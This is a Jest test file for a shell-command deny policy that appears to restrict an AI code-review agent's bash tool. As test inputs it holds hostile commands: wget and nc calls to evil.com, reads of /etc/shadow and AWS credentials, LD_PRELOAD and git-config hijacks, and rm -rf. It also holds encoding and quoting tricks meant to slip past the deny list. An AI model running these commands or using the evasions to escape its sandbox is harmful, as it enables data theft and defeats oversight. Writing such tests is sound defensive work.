import { evaluatePolicy } from '../../../../../../../src/stages/review/agentic/tools/bash/policy';

describe('evaluatePolicy', () => {
  describe('allowed commands', () => {
    it('git log is allowed', () => {
      expect(evaluatePolicy('git log --oneline -10')).toEqual({ deny: false });
    });

    it('git diff is allowed', () => {
      expect(evaluatePolicy('git diff HEAD~1 HEAD -- src/')).toEqual({ deny: false });
    });

    it('git status is allowed', () => {
      expect(evaluatePolicy('git status')).toEqual({ deny: false });
    });

    it('rg search is allowed', () => {
      expect(evaluatePolicy('rg "password" /workspace/pr -l')).toEqual({ deny: false });
    });

    it('grep search is allowed', () => {
      expect(evaluatePolicy('grep -r "TODO" /workspace/pr/src --include="*.ts"')).toEqual({
        deny: false,
      });
    });

    it('cat file is allowed', () => {
      expect(evaluatePolicy('cat /workspace/pr/src/auth.ts')).toEqual({ deny: false });
    });

    it('head file is allowed', () => {
      expect(evaluatePolicy('head -100 /workspace/pr/src/auth.ts')).toEqual({ deny: false });
    });

    it('tail -n N file is allowed (non-follow)', () => {
      expect(evaluatePolicy('tail -n 20 /workspace/pr/logs/test.log')).toEqual({ deny: false });
    });

    it('find without -exec is allowed', () => {
      expect(
        evaluatePolicy('find /workspace/pr -name "*.env*" -not -path "*/node_modules/*"'),
      ).toEqual({ deny: false });
    });

    it('jq on package.json is allowed', () => {
      expect(evaluatePolicy("jq '.dependencies' /workspace/pr/package.json")).toEqual({
        deny: false,
      });
    });

    it('tsc --noEmit is allowed', () => {
      expect(evaluatePolicy('tsc --noEmit')).toEqual({ deny: false });
    });

    it('eslint is allowed', () => {
      expect(evaluatePolicy('eslint src/ --format json')).toEqual({ deny: false });
    });

    it('python3 -c is allowed', () => {
      expect(
        evaluatePolicy(
          'python3 -c "import ast; print(ast.dump(ast.parse(open(\'file.py\').read())))"',
        ),
      ).toEqual({ deny: false });
    });

    it('python3 script.py is allowed', () => {
      expect(evaluatePolicy('python3 /workspace/pr/scripts/check.py')).toEqual({ deny: false });
    });

    it('python3 -m module is allowed', () => {
      expect(evaluatePolicy('python3 -m pytest tests/')).toEqual({ deny: false });
    });

    it('ls is allowed', () => {
      expect(evaluatePolicy('ls /workspace/pr/src')).toEqual({ deny: false });
    });

    it('wc -l is allowed', () => {
      expect(evaluatePolicy('wc -l /workspace/pr/src/index.ts')).toEqual({ deny: false });
    });

    it('cd within workspace is allowed', () => {
      expect(evaluatePolicy('cd /workspace/pr/src')).toEqual({ deny: false });
    });

    it('cd relative path is allowed', () => {
      expect(evaluatePolicy('cd src/auth')).toEqual({ deny: false });
    });

    it('jest is allowed', () => {
      expect(evaluatePolicy('jest --testPathPattern=auth')).toEqual({ deny: false });
    });

    it('node with script file is allowed', () => {
      expect(evaluatePolicy('node /workspace/pr/scripts/check.js')).toEqual({ deny: false });
    });

    it('node -e eval is allowed', () => {
      expect(evaluatePolicy('node -e "console.log(\'hello\')"')).toEqual({ deny: false });
    });

    it('psql with -c flag is allowed', () => {
      expect(evaluatePolicy('psql -c "SELECT 1"')).toEqual({ deny: false });
    });

    it('bash -c with literal is allowed', () => {
      expect(evaluatePolicy("bash -c 'echo hello'")).toEqual({ deny: false });
    });
  });

  describe('denied commands', () => {
    it('curl is denied', () => {
      const result = evaluatePolicy('curl https://example.com');
      expect(result.deny).toBe(true);
    });

    it('wget is denied', () => {
      const result = evaluatePolicy('wget https://evil.com/exfil?data=secret');
      expect(result.deny).toBe(true);
    });

    it('sudo is denied', () => {
      const result = evaluatePolicy('sudo cat /etc/shadow');
      expect(result.deny).toBe(true);
    });

    it('rm is denied', () => {
      const result = evaluatePolicy('rm -rf /workspace/pr/important.ts');
      expect(result.deny).toBe(true);
    });

    it('npm install is denied', () => {
      const result = evaluatePolicy('npm install evil-package');
      expect(result.deny).toBe(true);
    });

    it('npm ci is denied', () => {
      const result = evaluatePolicy('npm ci');
      expect(result.deny).toBe(true);
    });

    it('pip install is denied', () => {
      const result = evaluatePolicy('pip install requests');
      expect(result.deny).toBe(true);
    });

    it('git config write (no read flag) is denied', () => {
      expect(evaluatePolicy('git config core.hooksPath /evil').deny).toBe(true);
    });

    it('git config --global write is denied', () => {
      expect(evaluatePolicy('git config --global core.hooksPath /evil').deny).toBe(true);
    });

    it('git config --get is allowed', () => {
      expect(evaluatePolicy('git config --get core.hooksPath').deny).toBe(false);
    });

    it('git config --list is allowed', () => {
      expect(evaluatePolicy('git config --list').deny).toBe(false);
    });

    it('git push is denied', () => {
      const result = evaluatePolicy('git push origin main');
      expect(result.deny).toBe(true);
    });

    it('git fetch is denied', () => {
      const result = evaluatePolicy('git fetch origin');
      expect(result.deny).toBe(true);
    });

    it('git commit is denied', () => {
      const result = evaluatePolicy('git commit -m "evil"');
      expect(result.deny).toBe(true);
    });

    it('git checkout is denied', () => {
      const result = evaluatePolicy('git checkout main');
      expect(result.deny).toBe(true);
    });

    it('git -c core.fsmonitor= is denied', () => {
      const result = evaluatePolicy('git -c core.fsmonitor=malicious log');
      expect(result.deny).toBe(true);
    });

    it('git -c core.hooksPath= is denied', () => {
      const result = evaluatePolicy('git -c core.hooksPath=/evil log');
      expect(result.deny).toBe(true);
    });

    it('git -ccore.hooksPath= (concatenated, no space) is denied', () => {
      const result = evaluatePolicy('git -ccore.hooksPath=/evil log');
      expect(result.deny).toBe(true);
    });

    it('LD_PRELOAD env var is denied', () => {
      const result = evaluatePolicy('LD_PRELOAD=/evil.so cat /etc/passwd');
      expect(result.deny).toBe(true);
    });

    it('DYLD_INSERT_LIBRARIES is denied', () => {
      const result = evaluatePolicy('DYLD_INSERT_LIBRARIES=/evil.dylib ls');
      expect(result.deny).toBe(true);
    });

    it('trailing & is denied', () => {
      const result = evaluatePolicy('cat /etc/passwd &');
      expect(result.deny).toBe(true);
    });

    it('nohup is denied', () => {
      const result = evaluatePolicy('nohup evil-script.sh &');
      expect(result.deny).toBe(true);
    });

    it('bare python (REPL) is denied', () => {
      const result = evaluatePolicy('python3');
      expect(result.deny).toBe(true);
    });

    it('bare node (REPL) is denied', () => {
      const result = evaluatePolicy('node');
      expect(result.deny).toBe(true);
    });

    it('bare psql (REPL) is denied', () => {
      const result = evaluatePolicy('psql postgres://user:pass@host/db');
      expect(result.deny).toBe(true);
    });

    it('cd to /etc is denied', () => {
      const result = evaluatePolicy('cd /etc');
      expect(result.deny).toBe(true);
    });

    it('cd /workspace/../etc traversal is denied', () => {
      expect(evaluatePolicy('cd /workspace/../etc', { workspaceRoot: '/workspace' }).deny).toBe(
        true,
      );
    });

    it('cd to /root is denied', () => {
      const result = evaluatePolicy('cd /root');
      expect(result.deny).toBe(true);
    });

    it('output redirection to absolute path is denied', () => {
      const result = evaluatePolicy('cat /workspace/pr/src/auth.ts > /tmp/exfil');
      expect(result.deny).toBe(true);
    });

    it('tail -f is denied (interactive)', () => {
      const result = evaluatePolicy('tail -f /workspace/pr/logs/test.log');
      expect(result.deny).toBe(true);
    });

    it('ssh is denied', () => {
      const result = evaluatePolicy('ssh user@host');
      expect(result.deny).toBe(true);
    });

    it('nc (netcat) is denied', () => {
      const result = evaluatePolicy('nc evil.com 1234');
      expect(result.deny).toBe(true);
    });

    it('docker is denied', () => {
      const result = evaluatePolicy('docker run --rm alpine cat /etc/shadow');
      expect(result.deny).toBe(true);
    });

    it('empty command is denied', () => {
      const result = evaluatePolicy('');
      expect(result.deny).toBe(true);
    });

    it('git unknown subcommand is denied', () => {
      const result = evaluatePolicy('git bisect start');
      expect(result.deny).toBe(true);
    });

    it('bash -c with variable expansion is denied', () => {
      const result = evaluatePolicy('bash -c "cat $HOME/.aws/credentials"');
      expect(result.deny).toBe(true);
    });

    it('bash -c with concatenated flag (no space) and expansion is denied', () => {
      const result = evaluatePolicy('bash -c"cat $HOME/.aws/credentials"');
      expect(result.deny).toBe(true);
    });

    it('bash with no args (REPL) is denied', () => {
      const result = evaluatePolicy('bash');
      expect(result.deny).toBe(true);
    });

    it('eval is denied', () => {
      const result = evaluatePolicy('eval "malicious code"');
      expect(result.deny).toBe(true);
    });

    it('npx with exec is denied', () => {
      const result = evaluatePolicy('npx exec evil-pkg');
      expect(result.deny).toBe(true);
    });
  });

  describe('extraDeniedBinaries config', () => {
    it('custom denied binary is blocked', () => {
      const result = evaluatePolicy('my-custom-tool --dump', {
        extraDeniedBinaries: ['my-custom-tool'],
      });
      expect(result.deny).toBe(true);
    });

    it('non-denied custom binary is allowed', () => {
      const result = evaluatePolicy('other-tool --check', {
        extraDeniedBinaries: ['my-custom-tool'],
      });
      expect(result.deny).toBe(false);
    });
  });

  describe('additional spec §3.5 deny rules', () => {
    // Background / session escape
    it('setsid is denied', () => {
      expect(evaluatePolicy('setsid daemon &').deny).toBe(true);
    });

    it('disown is denied', () => {
      expect(evaluatePolicy('disown %1').deny).toBe(true);
    });

    it('su is denied', () => {
      expect(evaluatePolicy('su -c "cat /etc/shadow"').deny).toBe(true);
    });

    it('doas is denied', () => {
      expect(evaluatePolicy('doas sh').deny).toBe(true);
    });

    // cd escape (spec §3.5 lines 912-915)
    it('cd / is denied', () => {
      expect(evaluatePolicy('cd /').deny).toBe(true);
    });

    it('cd ~ is denied', () => {
      expect(evaluatePolicy('cd ~').deny).toBe(true);
    });

    it('cd - is denied', () => {
      expect(evaluatePolicy('cd -').deny).toBe(true);
    });

    // LD_LIBRARY_PATH (spec §3.5 line 940)
    it('LD_LIBRARY_PATH env injection is denied', () => {
      expect(evaluatePolicy('LD_LIBRARY_PATH=/evil ls').deny).toBe(true);
    });

    // git -c dangerous config keys (spec §3.5 lines 922-925)
    it('git -c gpg.program= is denied', () => {
      expect(evaluatePolicy('git -c gpg.program=/evil/gpg log').deny).toBe(true);
    });

    it('git -c core.editor= is denied', () => {
      expect(evaluatePolicy('git -c core.editor=evil commit').deny).toBe(true);
    });

    it('git -c sequence.editor= is denied', () => {
      expect(evaluatePolicy('git -c sequence.editor=evil rebase').deny).toBe(true);
    });

    it('git -c uploadpack.packObjectsHook= is denied', () => {
      expect(evaluatePolicy('git -c uploadpack.packObjectsHook=evil ls-files').deny).toBe(true);
    });

    it('git -c credential.helper= is denied', () => {
      expect(evaluatePolicy('git -c credential.helper=evil log').deny).toBe(true);
    });

    // git remote write subcommands (spec §3.5 lines 903-904)
    it('git remote add is denied', () => {
      expect(evaluatePolicy('git remote add origin https://evil.com/repo.git').deny).toBe(true);
    });

    it('git remote set-url is denied', () => {
      expect(evaluatePolicy('git remote set-url origin https://evil.com/repo.git').deny).toBe(true);
    });

    it('git remote get-url is allowed', () => {
      expect(evaluatePolicy('git remote get-url origin').deny).toBe(false);
    });

    it('git remote -v is allowed', () => {
      expect(evaluatePolicy('git remote -v').deny).toBe(false);
    });

    // Append redirection to absolute path
    it('>> to absolute path is denied', () => {
      expect(evaluatePolicy('cat /workspace/pr/file.ts >> /tmp/exfil').deny).toBe(true);
    });

    // Interactive REPL additions (spec §3.5 lines 959-962)
    it('bare sqlite3 is denied', () => {
      expect(evaluatePolicy('sqlite3 /workspace/pr/db.sqlite').deny).toBe(true);
    });

    it('sqlite3 with SQL query is allowed', () => {
      expect(
        evaluatePolicy('sqlite3 /workspace/pr/db.sqlite "SELECT * FROM users LIMIT 5"').deny,
      ).toBe(false);
    });

    it('mongosh is denied', () => {
      expect(evaluatePolicy('mongosh mongodb://localhost/mydb').deny).toBe(true);
    });

    it('ipython is denied', () => {
      expect(evaluatePolicy('ipython').deny).toBe(true);
    });

    it('deno is denied', () => {
      expect(evaluatePolicy('deno').deny).toBe(true);
    });

    it('bun is denied', () => {
      expect(evaluatePolicy('bun').deny).toBe(true);
    });

    // File-reading tools outside workspace (path-outside-workspace rule)
    it('cat /etc/passwd is denied', () => {
      expect(evaluatePolicy('cat /etc/passwd').deny).toBe(true);
    });

    it('cat /etc/shadow is denied', () => {
      expect(evaluatePolicy('cat /etc/shadow').deny).toBe(true);
    });

    it('head /etc/passwd is denied', () => {
      expect(evaluatePolicy('head /etc/passwd').deny).toBe(true);
    });

    it('cp /etc/passwd /tmp/exfil is denied', () => {
      expect(evaluatePolicy('cp /etc/passwd /tmp/exfil').deny).toBe(true);
    });

    it("cat with single-quoted absolute path '/etc/passwd' is denied", () => {
      expect(evaluatePolicy("cat '/etc/passwd'").deny).toBe(true);
    });

    it("cat with ANSI-C quoted path $'/etc/passwd' is denied", () => {
      expect(evaluatePolicy("cat $'/etc/passwd'").deny).toBe(true);
    });

    it('cat with double-quoted absolute path "/etc/passwd" is denied', () => {
      expect(evaluatePolicy('cat "/etc/passwd"').deny).toBe(true);
    });

    it('cat within workspace is allowed', () => {
      expect(
        evaluatePolicy('cat /workspace/pr/src/foo.ts', { workspaceRoot: '/workspace' }).deny,
      ).toBe(false);
    });

    it('cat relative path is allowed', () => {
      expect(evaluatePolicy('cat src/foo.ts').deny).toBe(false);
    });

    it('cat relative path traversal is denied when workspaceRoot is set', () => {
      expect(evaluatePolicy('cat ../../etc/passwd', { workspaceRoot: '/workspace' }).deny).toBe(
        true,
      );
    });

    it('cat relative path within workspace is allowed when workspaceRoot is set', () => {
      expect(evaluatePolicy('cat src/foo.ts', { workspaceRoot: '/workspace/pr' }).deny).toBe(false);
    });
  });

  describe('workspaceRoot variants — CI vs local', () => {
    const LOCAL_ROOT = '/home/runner/work/my-repo/my-repo';

    it('cat inside local workspaceRoot is allowed', () => {
      expect(
        evaluatePolicy(`cat ${LOCAL_ROOT}/src/auth.ts`, { workspaceRoot: LOCAL_ROOT }).deny,
      ).toBe(false);
    });

    it('cat outside local workspaceRoot is denied', () => {
      expect(
        evaluatePolicy('cat /workspace/pr/src/auth.ts', { workspaceRoot: LOCAL_ROOT }).deny,
      ).toBe(true);
    });

    it('cat inside CI /workspace/pr is allowed', () => {
      expect(
        evaluatePolicy('cat /workspace/pr/src/auth.ts', { workspaceRoot: '/workspace/pr' }).deny,
      ).toBe(false);
    });

    it('cat outside CI root targeting local path is denied', () => {
      expect(
        evaluatePolicy(`cat ${LOCAL_ROOT}/src/auth.ts`, { workspaceRoot: '/workspace/pr' }).deny,
      ).toBe(true);
    });

    it('cd to local workspaceRoot is allowed', () => {
      expect(evaluatePolicy(`cd ${LOCAL_ROOT}`, { workspaceRoot: LOCAL_ROOT }).deny).toBe(false);
    });

    it('cd to /workspace/pr is denied when workspaceRoot is local path', () => {
      expect(evaluatePolicy('cd /workspace/pr', { workspaceRoot: LOCAL_ROOT }).deny).toBe(true);
    });

    it('relative path traversal is denied regardless of workspaceRoot', () => {
      expect(evaluatePolicy('cat ../../etc/passwd', { workspaceRoot: LOCAL_ROOT }).deny).toBe(true);
    });
  });

  describe('additional spec §3.8 compatibility allows', () => {
    it('mysql -e SQL is allowed', () => {
      expect(evaluatePolicy('mysql -e "SELECT 1"').deny).toBe(false);
    });

    it('bash -c with single-quoted allowed pipeline is allowed', () => {
      // Script is recursively evaluated — rg and head are both allowed
      expect(evaluatePolicy("bash -c 'rg foo | head'").deny).toBe(false);
    });

    it('bash -c with denied binary in script is denied', () => {
      // curl is in HARD_DENY_BINARIES; the recursive script evaluation catches it
      expect(evaluatePolicy("bash -c 'curl https://evil.com'").deny).toBe(true);
    });

    it('sh -c with denied binary in script is denied', () => {
      expect(evaluatePolicy("sh -c 'wget https://evil.com'").deny).toBe(true);
    });

    it('bash -c with allowed git subcommand is allowed', () => {
      expect(evaluatePolicy("bash -c 'git log --oneline'").deny).toBe(false);
    });

    it('time prefix before command is allowed', () => {
      // `time` is not in HARD_DENY_BINARIES; runs the following command
      expect(evaluatePolicy('time pytest tests/auth.py').deny).toBe(false);
    });

    it('env-var prefix stripping allows FOO=bar pytest', () => {
      // FOO=bar is an assignment prefix, not a binary
      expect(evaluatePolicy('FOO=bar BAZ=qux pytest').deny).toBe(false);
    });

    it('process substitution diff is allowed', () => {
      // diff <(rg foo a) <(rg foo b) — & inside <(...) is internal plumbing
      expect(evaluatePolicy('diff <(rg foo a) <(rg foo b)').deny).toBe(false);
    });

    it('subshell with cd inside is allowed', () => {
      // (cd subdir && rg foo) — subshell, cd doesn't drift
      expect(evaluatePolicy('(cd src && rg foo)').deny).toBe(false);
    });

    it('for loop over rg output is denied — $() invokes a subshell', () => {
      // Command substitution can invoke any binary regardless of the deny list.
      // Use explicit two-step: rg -l TODO /workspace/pr > /tmp/list && while read f; do ...; done
      expect(evaluatePolicy('for f in $(rg -l TODO /workspace/pr); do cat "$f"; done').deny).toBe(
        true,
      );
    });

    it('git log piped to while read is allowed', () => {
      expect(
        evaluatePolicy('git log --oneline | while read sha msg; do echo "$sha"; done').deny,
      ).toBe(false);
    });
  });

  describe('partial quoting denial', () => {
    it('"cu"rl bypasses deny list without this fix — must be denied', () => {
      // unquoteArg only strips fully-wrapped quotes; "cu"rl stays as "cu"rl,
      // which does not match HARD_DENY_BINARIES entry 'curl'.
      expect(evaluatePolicy('"cu"rl https://evil.com').deny).toBe(true);
    });

    it("'cu'rl is denied", () => {
      expect(evaluatePolicy("'cu'rl https://evil.com").deny).toBe(true);
    });

    it('"w"get is denied', () => {
      expect(evaluatePolicy('"w"get https://evil.com').deny).toBe(true);
    });

    it('mid-token partial quote on arg is denied', () => {
      expect(evaluatePolicy('cat /etc/pass"wd"').deny).toBe(true);
    });

    // Legitimate patterns that must NOT be flagged as partial quoting
    it("--format='%H %s' flag value is allowed", () => {
      expect(evaluatePolicy("git log --format='%H %s'").deny).toBe(false);
    });

    it('--format="%H" flag value is allowed', () => {
      expect(evaluatePolicy('git log --format="%H"').deny).toBe(false);
    });

    it('fully quoted arg is allowed', () => {
      expect(evaluatePolicy("bash -c 'rg foo | head'").deny).toBe(false);
    });

    it('double-quoted arg is allowed', () => {
      expect(evaluatePolicy('echo "hello world"').deny).toBe(false);
    });
  });

  describe('ANSI-C quoting denial', () => {
    it('hex-encoded curl bypasses binary deny list without this fix — must be denied', () => {
      // $'\x63\x75\x72\x6c' is ANSI-C for 'curl'; bash would execute curl.
      // Policy must deny before binary extraction reaches HARD_DENY_BINARIES.
      expect(evaluatePolicy("$'\\x63\\x75\\x72\\x6c' https://evil.com").deny).toBe(true);
    });

    it('hex-encoded wget is denied', () => {
      expect(evaluatePolicy("$'\\x77\\x67\\x65\\x74' https://evil.com").deny).toBe(true);
    });

    it('octal-encoded ssh is denied', () => {
      // $'\163\163\150' = 'ssh' in octal
      expect(evaluatePolicy("$'\\163\\163\\150' user@host").deny).toBe(true);
    });

    it('hex-encoded rm is denied', () => {
      expect(evaluatePolicy("$'\\x72\\x6d' -rf /workspace").deny).toBe(true);
    });

    it('ANSI-C quoted arg (even in benign command) is denied', () => {
      // Even if the binary is safe, ANSI-C in args could encode paths or flag values.
      expect(evaluatePolicy("echo $'hello world'").deny).toBe(true);
    });
  });

  describe('command substitution denial', () => {
    it('echo with bare $() subshell is denied', () => {
      expect(evaluatePolicy('echo $(curl https://evil.com)').deny).toBe(true);
    });

    it('echo with double-quoted $() subshell is denied — key bypass fixed', () => {
      // toAnalysisCopy strips "$(curl ...)" to "__DQ__"; without hasSubshell scanning
      // the raw string, this would pass policy with hasExpansion=false.
      expect(evaluatePolicy('echo "$(curl https://evil.com)"').deny).toBe(true);
    });

    it('echo with backtick subshell is denied', () => {
      expect(evaluatePolicy('echo `curl https://evil.com`').deny).toBe(true);
    });

    it('echo with double-quoted backtick subshell is denied', () => {
      expect(evaluatePolicy('echo "`curl https://evil.com`"').deny).toBe(true);
    });

    it('$VAR variable reference is allowed — no subshell invoked', () => {
      expect(evaluatePolicy('cat $HOME/.bashrc').deny).toBe(false);
    });

    it('${VAR} brace variable reference is allowed', () => {
      expect(evaluatePolicy('ls ${HOME}').deny).toBe(false);
    });

    it('process substitution <(...) is allowed — no $() syntax', () => {
      expect(evaluatePolicy('diff <(rg foo a) <(rg foo b)').deny).toBe(false);
    });
  });

  describe('env-hijacking denial extensions', () => {
    it('BASH_ENV inline assignment is denied', () => {
      expect(evaluatePolicy('BASH_ENV=/tmp/evil.sh cat /workspace/pr/file.ts').deny).toBe(true);
    });

    it('ENV inline assignment is denied', () => {
      expect(evaluatePolicy('ENV=/tmp/evil.sh sh /workspace/pr/run.sh').deny).toBe(true);
    });

    it('NODE_OPTIONS inline assignment is denied', () => {
      expect(
        evaluatePolicy("NODE_OPTIONS='--require /tmp/evil.js' node /workspace/pr/app.js").deny,
      ).toBe(true);
    });

    it('LD_AUDIT inline assignment is denied', () => {
      expect(evaluatePolicy('LD_AUDIT=/tmp/evil.so ls /workspace/pr').deny).toBe(true);
    });

    it('DYLD_INSERT_LIBRARIES inline assignment is denied', () => {
      expect(evaluatePolicy('DYLD_INSERT_LIBRARIES=/evil.dylib ls /workspace/pr').deny).toBe(true);
    });
  });
});
